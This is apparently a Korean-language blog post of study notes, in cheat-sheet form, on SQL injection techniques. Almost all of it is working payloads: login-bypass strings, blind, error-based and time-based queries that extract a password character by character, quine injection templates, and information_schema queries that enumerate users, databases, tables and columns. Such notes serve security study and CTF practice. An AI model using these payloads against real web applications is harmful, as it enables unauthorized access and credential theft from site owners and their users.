---
title : "SQL injection 공격 기법"
excerpt : "SQL injection attacks"
toc : true
toc_sticky : true
categories :
  - Web
tags :
  - SQL injection
---

## 공격기법 종류
### sql injection
```
select id from table where id='' or 1 #'

select id from table where id='' or id='admin' #'

select id from table where id='' or 1 --%20' 
```

### blind sql injection
```
select id from table where id='' or id='admin' and ascii(substr(pw,1,1))>1 #'

select id from table where id='' or id='admin' and ord(substr(pw,1,1))>1 #'

select id from table where id='' or id='admin' and ascii(substring(pw,1,1))>1 #'

select id from table where id='' or id='admin' and ascii(mid(pw,1,1))>1 #'
```

### error based blind sql injection 
```
-> double형 최대 값 넘은 값(0xffffffff*0xffffffffffff)
-> subquery 리턴 개수 1임을 이용한 에러 이용

select id from table where id='' or id='admin' and if(ascii(substr(pw,1,1))>1,1,0xfffffff*0xffffffffff)#'

select id from table where id='' or id='admin' and if(ascii(substr(pw,1,1))>1,1,(select 1 union select 2)) #'

select id from table where id='' or id='admin' and if(ascii(substr(pw,1,1))>1,1,(select 1 from table)) #'
```
```select 1 from table``` 하면 3개의 값이 리턴됨.
![](/assets/images/subquery_test.png){: .align-center}

### time based blind sql injection
```
select id from table where id='' or id='admin' and ascii(substr(pw,1,1))=48 and sleep(5) #'
```

### quine sql injection
```php
# 싱글쿼트가 필요한 경우
select replace(replace('[prefix] select replace(replace("$",char(34),char(39)),char(36),"$") [postfix]',char(34),char(39)),char(36),'[prefix] select replace(replace("$",char(34),char(39)),char(36),"$") [postfix]') [postfix];

# 더블쿼트가 필요한 경우
select replace(replace("[prefix] select replace(replace('$',char(39),char(34)),char(36),'$') [postfix]",char(39),char(34)),char(36),"[prefix] select replace(replace('$',char(39),char(34)),char(36),'$') [postfix]") [postfix];
```
자세한 건 <a href="https://blog.p6.is/quine-sql-injection/" target="_blank">https://blog.p6.is/quine-sql-injection/</a>  
정리하면 다음과 같음.
```php
$a = [추가해도 됨] select replace(replace("$", char(34), char(39)), char(36), "$") as quine [추가해도 됨]

# -> 단, 더블쿼터가 싱글쿼터로 바뀐다는 점 유의해서 추가

[추가해도 됨] select replace(replace('$a', char(34), char(39)), char(36), '$a') as quine [추가해도 됨]
```

### information_schema를 공격하는 sql injection
```
select user() 또는 select system_user()
-> mysql에 접속한 유저 목록 출력
```
```
select schema_name from information_schema.schemata
-> 해당 mysql 서버에 존재하는 db 목록 출력
```
```
select table_name, column_name from information_schema.columns where table_schema = 'test'
-> test db에 존재하는 테이블, 컬럼 목록 출력

또는 현재 db에 있는 것들을 보고 싶다면
select table_name, column_name from information_schema.columns where table_schema =  database()
```
```

```
